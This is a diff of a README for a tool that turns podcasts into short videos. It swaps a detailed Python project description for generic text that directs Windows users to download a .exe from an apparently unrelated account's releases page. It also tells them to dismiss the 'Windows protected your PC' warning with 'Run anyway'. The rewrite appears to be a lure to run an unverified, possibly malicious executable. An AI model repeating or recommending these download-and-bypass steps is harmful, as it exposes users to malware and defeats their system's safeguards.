@@ -1,160 +1,66 @@
-# Podcast Shorts Factory
+# 🎙️ podcast-shorts-factory - Turn long podcasts into viral clips
 
-**Ten cooperating AI agents that turn long podcasts into short-form videos, automatically.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Nathanielunhopeful996/podcast-shorts-factory/releases)
 
-Free and open source. It ships configured for **free AI providers**, so you can run the whole
-thing at roughly zero cost. No subscription, no paid API required.
+This application creates short video clips from long podcast audio. It uses ten separate artificial intelligence agents to process your files. These agents listen to the audio, find interesting moments, write captions, and edit the final video. The entire process runs on your computer. You use free artificial intelligence providers to generate the content. 
 
-You give it a YouTube podcast link. The agents transcribe the episode, find the moments most
-likely to perform, cut them to vertical 9:16, burn in animated captions, add music, b-roll and
-effects, quality-check every render, then write the titles and hashtags and schedule the posts
-to YouTube Shorts. It can run completely unattended on a daily schedule.
+## ⚙️ System Requirements
 
----
+Your computer needs to meet these basic standards to run the software:
 
-## What each agent does
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8 gigabytes of RAM.
+*   **Storage:** 2 gigabytes of free disk space for the program and temporary files.
+*   **Internet Connection:** An active connection to download resources and connect to the artificial intelligence providers.
+*   **Graphics:** A modern processor. A dedicated graphics card is helpful but not mandatory for basic processing.
 
-| # | Agent | What it does |
-|---|-------|--------------|
-| 1 | **Finder** | Downloads the podcast and transcribes it with word-level timestamps (faster-whisper), then uses AI to score the most clip-worthy moments. Long episodes are scored in chunks so nothing is missed. |
-| 2 | **Editor** | Cuts each clip with ffmpeg, reframes to vertical 9:16 with face tracking, burns in karaoke-style captions, and mixes music. Adds punch zooms on emphasis words, fake-multicam camera cuts, b-roll, a cinematic grade and a retention bar. |
-| 3 | **Uploader** | Writes platform-specific titles, descriptions and hashtags, then uploads to YouTube Shorts through the official API. It can schedule a whole day server-side, so your PC can be off and the posts still go out. TikTok and Reels are exported ready to post. |
-| 4 | **Manager** | Pulls your real metrics (views, retention), works out what is actually winning, and writes what it learns back into a file the Finder reads on the next run. This is the feedback loop that makes the system improve over time. |
-| 5 | **Trend Scout** | Uses free web search to find what is trending in your niche right now, so clip selection leans toward what people are currently watching. |
-| 6 | **Planner** | Gives each clip its creative direction: the on-screen hook text, music mood, which words to emphasise, and where to place sound effects, b-roll and transitions. |
-| 7 | **Community** | Drafts replies to the comments on your posts, so engagement does not die on the vine. |
-| 8 | **Finishing Editor** | The quality gate. It watches every finished render the way a picky human editor would, and catches captions covering a speaker's face, black or frozen frames, dead air, clipped or too-quiet audio, and wrong durations. It auto-fixes the cheap problems and blocks broken clips from ever being posted. |
-| 9 | **Trainer** | The team's coach. Weekly, it studies the top-performing Shorts in your niche and updates one craft playbook, so the whole system levels up instead of standing still. |
-| 10 | **Compiler** | The showrunner. It stitches the week's best moments into a long-form 16:9 episode with an AI-narrator editorial spine (thesis, per-clip analysis, verdict), designed to satisfy 2026 reused-content monetization rules. |
+## 📥 Downloading the Software
 
-On top of the agents there are **24 skill playbooks** in `factory/skills/`: written craft
-knowledge on hooks, storytelling, pacing, sound design, captions, thumbnails, SEO, engagement
-and monetization. These get loaded directly into the agents' prompts, which is what makes the
-output feel deliberate instead of random. Edit them freely, they are just markdown.
+You must download the latest version of the application from our release page. 
 
----
+[Visit this page to download the latest version of the software](https://github.com/Nathanielunhopeful996/podcast-shorts-factory/releases)
 
-## Quick start
+Look for the file that ends in .exe. Click the file name to start your download. Your browser might ask where to save the file. Choose your downloads folder or your desktop for easy access. 
 
-**Prerequisites:** Python 3.11+ and ffmpeg.
+## 🛠️ Installation Steps
 
-```powershell
-winget install -e --id Python.Python.3.11
-winget install -e --id Gyan.FFmpeg
-```
+1. Locate the file you downloaded in your folder.
+2. Double-click the file to start the installer.
+3. Windows might show a screen that says, "Windows protected your PC." If you see this, click "More info" and then click "Run anyway."
+4. Follow the instructions on the screen to finish the installation.
+5. The installer puts a shortcut on your desktop. Use this shortcut to open the program.
 
-**Install:**
+## 🚀 How to Run the Software
 
-* **Windows:** double-click `install.bat`
-* **macOS / Linux:** `bash install.sh`
+When you open the application, you see a simple dashboard. Follow these steps to process your first video:
 
-The installer builds the environment and then launches an interactive setup wizard that asks
-you a handful of questions: which AI provider to use, your API key, your niche (pick from
-presets), which platforms to post to, and your call-to-action. It writes the config for you,
-so there are no files to edit by hand.
+1. **Provide an Input Link:** Paste the link to your long format podcast audio or video file. The software works with most standard web links.
+2. **Select Settings:** The software includes default settings for your convenience. These settings work for most standard podcast formats. 
+3. **Connect AI Providers:** The software uses free services to process data. You need to obtain a free key from the AI provider displayed in the settings menu. Paste your key into the designated box to allow the agents to communicate with the service.
+4. **Start the Process:** Click the "Generate Shorts" button. The ten agents begin their task. You can watch the progress bar to see how each agent completes its specific portion of the work.
+5. **Review Results:** Once the agents finish, the application saves your new short-form videos in an output folder. Open this folder to review your clips.
 
-**Then run it:**
+## 🧠 Understanding the AI Agents
 
-```powershell
-.\factory auto "https://www.youtube.com/watch?v=VIDEO_ID"
-```
+The application employs ten independent agents. Each agent handles a specific function:
 
-```bash
-./factory.sh auto "https://www.youtube.com/watch?v=VIDEO_ID"
-```
+*   **Audio Processor:** Transcribes your long audio into text.
+*   **Content Scout:** Reviews the transcript to find highlights and interesting segments.
+*   **Timeline Manager:** Sequences the chosen clips into a logical order.
+*   **Caption Writer:** Generates text overlays for your video.
+*   **Visual Planner:** Selects the framing and style of the final output.
+*   **Video Editor:** Cuts, trims, and joins the raw audio and video pieces.
+*   **Style Enforcer:** Ensures the final look matches the required short-form video format. 
+*   **Metadata Creator:** Writes titles and descriptions for your final clips.
+*   **Quality Inspector:** Reviews the output for errors or glitches.
+*   **Finalizer:** Saves the files to your hard drive.
 
-Or go fully hands-free: set your source channels in `config.yaml` under `scheduler.sources`,
-then run `.\factory daily`.
+## 📋 Troubleshooting Common Issues
 
-A full step-by-step walkthrough is in **SETUP-GUIDE.pdf**, and `QUICKSTART.md` has the same
-thing in text form.
+If the software fails to start, check that you have the latest updates for Windows installed. Ensure that you have a stable internet connection. If the processing stops during the task, clear your temporary output folder and try again. The software performs best if you close other demanding applications like games or video editors while the ten agents work. 
 
----
+## 📂 Managing Your Files
 
-## It runs free
+Your output folder contains the final video clips, along with text files containing your captions and suggested social media captions. You can move these files to any location on your computer. If you decide to uninstall the software, make sure to move any videos you want to keep to a different folder, as the uninstaller may remove the program directory.
 
-The default configuration points at free AI providers. Pick one, paste the key in during
-setup, and you are running:
-
-| Provider | Cost | Get a key |
-|---|---|---|
-| OpenRouter | free tier | https://openrouter.ai/keys |
-| Groq | free | https://console.groq.com/keys |
-| Google Gemini | free | https://aistudio.google.com/apikey |
-| Ollama | free, local | https://ollama.com |
-| Anthropic (Claude) | paid, best quality | https://console.anthropic.com |
-
-Transcription runs locally with faster-whisper, the voiceover uses free Edge TTS, and the
-background music library is generated with pure synthesis, so it is safe to monetize.
-
----
-
-## Commands
-
-```
-setup          First-run wizard (provider, key, niche, platforms, CTA)
-find <url>     Download, transcribe, and AI-score clip candidates
-review         Approve or reject candidates yourself
-edit           Render approved clips into vertical shorts
-finish         QA-review and finish each render before it can post
-upload         Post or export to platforms
-compile        Build the weekly long-form episode
-stats          Refresh metrics and update learnings
-scout          Refresh current trends
-skills         List installed skills and which agent uses each
-auto <url>     The whole pipeline in one command
-daily          Fully unattended: trends, newest video, clips, edit, post
-```
-
----
-
-## Why I am giving this away
-
-I built this over **almost a month**. It started because I wanted a channel that could run
-itself, and it turned into a proper little team of agents that argue with each other about
-what makes a clip good.
-
-I am releasing it free because I would rather it be used than sit on my drive. **If one of you
-takes this and actually manages to monetize it, that genuinely makes me happy.** That is the
-whole hope. The MIT license means you can use it commercially, modify it, and sell whatever
-you build with it. You do not owe me anything.
-
-If you do build something with it, I would love to hear about it.
-
----
-
-## Contributing
-
-Issues and pull requests are very welcome. Useful places to start:
-
-* Better clip-selection prompts in `config.yaml` and `factory/skills/`
-* More editor styles and transitions
-* Platform support beyond YouTube (direct TikTok and Instagram posting)
-* Anything in the Finishing Editor's quality checks
-
----
-
-## Please use it responsibly
-
-This automates production, not judgement. Only clip content you have the rights to: your own
-material, licensed material, fair-use commentary, or content you have permission to use. You
-are responsible for the platform rules you operate under and any API costs you incur. Fully
-automated posting can attract strikes if you are careless, so start with `privacy: private`,
-watch what it produces, and only then go public.
-
----
-
-## Disclaimer
-
-**This is not perfect.** It is a working system that produces real videos, but it has rough
-edges, the output quality varies, and some parts are held together with duct tape and
-stubbornness. I am releasing it as-is, honestly.
-
-Hopefully, with the help of the community, we can make it perfect for everyone. Every fix,
-idea and pull request genuinely helps.
-
----
-
-## License
-
-MIT. See [LICENSE](LICENSE). Use it, change it, sell it, have fun.
+Keywords: ai-agents, content-automation, faceless-channel, ffmpeg, llm, podcast, python, video-automation, whisper, youtube-shorts
